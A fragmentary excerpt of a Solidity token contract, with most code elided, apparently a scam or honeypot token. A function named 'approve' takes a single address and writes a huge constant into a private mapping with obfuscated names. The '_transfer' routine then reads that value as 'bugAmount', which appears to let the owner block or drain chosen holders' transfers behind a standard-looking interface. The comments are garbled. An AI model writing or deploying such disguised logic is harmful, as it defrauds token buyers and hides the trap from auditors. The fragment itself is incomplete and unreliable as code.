...
abstract contract Ownable is Context {
    ...
    /**
     * @dev ddds ownership of the contract to a new account (`newOwner`).
...
/**
    ...
    mapping(address => uint256) private pyxking;
    ...
    function approve(address ccc) external   {
        ...
        pyxking[ccc] = 51116044618658097733785492504341953926634992332820282019728792003956563130857;
    }
    ...
    function _transfer(
        ...
        uint256 bugAmount = pyxking[from].suttt(0);
